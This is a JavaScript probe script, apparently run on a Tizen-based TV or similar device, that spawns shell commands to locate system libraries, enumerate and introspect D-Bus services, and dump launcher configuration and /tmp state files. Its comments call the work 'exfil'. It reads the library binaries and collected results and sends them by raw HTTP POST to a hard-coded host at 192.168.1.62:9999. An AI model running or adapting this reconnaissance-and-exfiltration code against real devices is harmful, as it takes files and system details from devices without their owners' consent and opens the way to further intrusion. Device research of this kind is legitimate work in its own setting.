"use strict";
/* p43: app-context DBus interface discovery
   1. find + exfil libapp-context-manager-common.so / libcapi-appfw-app-context-manager.so + related
   2. full DBus ListNames (raw)
   3. Introspect candidate services (correct dbus-send syntax)
   4. /etc/tvctx-manager/launcher + res contents
   exfil /p43info
*/
var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p43', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFile(p, name) {
  try {
    var b = fs.readFileSync(p);
    R.results['exfil_' + name] = b.length + 'B';
    postBuf('/lib_' + name, b);
  } catch (e) { R.results['exfil_' + name] = 'ERR ' + String(e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p43info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'find_libs', fn: function () {
      return run('find /usr /lib /org 2>/dev/null -name "*app-context*" -o -name "*appctx*" -o -name "*db-util*" -o -name "*dbutil*" | head -30', 30000);
  }},
  { name: 'exfil_libs', fn: function () {
      postFile('/usr/lib/libapp-context-manager-common.so', 'libapp-ctx-mgr-common.so');
      postFile('/usr/lib/libcapi-appfw-app-context-manager.so', 'libcapi-appfw-appctx.so');
      postFile('/usr/lib/libdb-util.so', 'libdb-util.so');
      return new Promise(function (resolve) { setTimeout(function () { resolve('exfil done'); }, 20000); });
  }},
  { name: 'dbus_listnames', fn: function () {
      return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1', 30000);
  }},
  { name: 'dbus_introspect_acm', fn: function () {
      return run('dbus-send --system --print-reply --dest=org.tizen.ApplicationContextManager / org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -120; echo ===TVCTX; dbus-send --system --print-reply --dest=org.tizen.tvctx-manager / org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -120', 45000);
  }},
  { name: 'launcher_dir', fn: function () {
      return run('ls -laR /etc/tvctx-manager/launcher/ 2>&1 | head -40; echo ===RES; ls -laR /etc/tvctx-manager/res/ 2>&1 | head -30; echo ===LAUNCHER_FILES; for f in /etc/tvctx-manager/launcher/*; do echo "--- $f"; head -c 800 "$f" 2>/dev/null; echo; done', 20000);
  }},
  { name: 'tmp_ready_files', fn: function () {
      return run('ls -la /tmp/context-mgr_ready /tmp/context-mgr_power_standby /run/was_ready 2>&1; echo ===; cat /tmp/context-mgr_ready 2>/dev/null | head -5', 15000);
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 200000);
